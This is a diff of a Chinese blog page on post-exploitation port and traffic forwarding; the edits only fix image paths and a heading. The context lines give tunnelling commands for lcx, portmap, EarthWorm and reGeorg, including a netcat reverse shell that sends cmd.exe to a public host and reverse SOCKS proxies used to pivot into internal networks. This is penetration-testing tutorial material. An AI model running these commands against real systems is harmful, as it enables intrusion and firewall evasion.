@@ -472,7 +472,7 @@
 <h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><p><strong>端口转发草图：</strong></p>
 <p><img src="/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E8%8D%89%E5%9B%BE.png" alt="端口转发草图"></p>
 <h3 id="LCX-端口转发"><a href="#LCX-端口转发" class="headerlink" title="LCX 端口转发"></a>LCX 端口转发</h3><p>lcx.exe是一款windows上端口转发工具；</p>
-<p><img src="/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%5Clcx.png"></p>
+<p><img src="/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/lcx.png" alt="lcx"></p>
 <h4 id="·反向转发"><a href="#·反向转发" class="headerlink" title="·反向转发"></a>·反向转发</h4><blockquote>
 <p>内网主机执行：lcx.exe  -slave 公网主机IP 公网主机端口 内网主机IP 内网主机端口</p>
 </blockquote>
@@ -487,7 +487,7 @@
 </blockquote>
 <p>验证：任何主机远程连接目标主机的53端口，即可连接到目标主机；</p>
 <h3 id="port-map端口转发"><a href="#port-map端口转发" class="headerlink" title="port map端口转发"></a>port map端口转发</h3><p>portmap是一款linux上端口转发工具</p>
-<p><img src="/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%5Cportmap.png"></p>
+<p><img src="/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/portmap.png" alt="portmap"></p>
 <h4 id="·反向转发-1"><a href="#·反向转发-1" class="headerlink" title="·反向转发"></a>·反向转发</h4><blockquote>
 <p>内网主机执行：./portmap -m 3 -h1 内网主机IP -p1 22 -h2 公网主机IP -p2 6666</p>
 </blockquote>
@@ -499,7 +499,7 @@
 <p>目标主机上执行：./portmap -m 1 -h1 内网主机IP -p1 22  -p2 6666</p>
 </blockquote>
 <p>验证：ssh 内网主机IP 6666，即可连接到内网主机</p>
-<h3 id="NC反弹"><a href="#NC反弹" class="headerlink" title="NC反弹"></a>NC反弹</h3><p><img src="/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%5Cnc.png"></p>
+<h3 id="NC反弹"><a href="#NC反弹" class="headerlink" title="NC反弹"></a>NC反弹</h3><p><img src="/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/nc.png" alt="nc"></p>
 <h4 id="·反向连接"><a href="#·反向连接" class="headerlink" title="·反向连接"></a>·反向连接</h4><blockquote>
 <p>公网主机监听：nc -lvp 端口</p>
 <p>内网主机执行：nc -t -e cmd.exe 公网主机IP 端口</p>
@@ -513,7 +513,7 @@
 <h1 id="流量转发"><a href="#流量转发" class="headerlink" title="流量转发"></a>流量转发</h1><p><strong>Termite 是EW（EarthWorm）的最新版，官方链接： <a target="_blank" rel="noopener" href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a></strong></p>
 <p>主要特性： 多平台支持、跳板机互联、正反向级联、小巧无依赖、内置Shell令主机管理更方便</p>
 <p><strong>EW（EarthWorm）</strong></p>
-<p><img src="/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%5Cew.png"></p>
+<p><img src="/2021/02/04/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/ew.png" alt="ew"></p>
 <h4 id="·正向端口转发"><a href="#·正向端口转发" class="headerlink" title="·正向端口转发"></a>·正向端口转发</h4><blockquote>
 <p>目标主机执行：ew -s  lcx_tran -l 53 -f 目标主机ip -g 3389</p>
 </blockquote>
@@ -533,7 +533,7 @@
 <blockquote>
 <p>目标主机执行：ew -s rssocks -d 公网IP -e 1024     <!--启动代理通过socks隧道并反弹到公网IP的1024端口上-->       </p>
 </blockquote>
-<h4 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h4><p>reGeorg是reDuh的升级版   工具地址： <a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
+<h3 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h3><p>reGeorg是reDuh的升级版   工具地址： <a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
 <p>使用方法：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python reGeorgSocksProxy.py -p 8080 -u http:&#x2F;&#x2F;upload.sensepost.net:8080&#x2F;tunnel&#x2F;tunnel.jsp</span><br></pre></td></tr></table></figure>
 <p>[^注]: 运行.py脚本 去访问目标主机上相对应传上去的脚本文件</p>
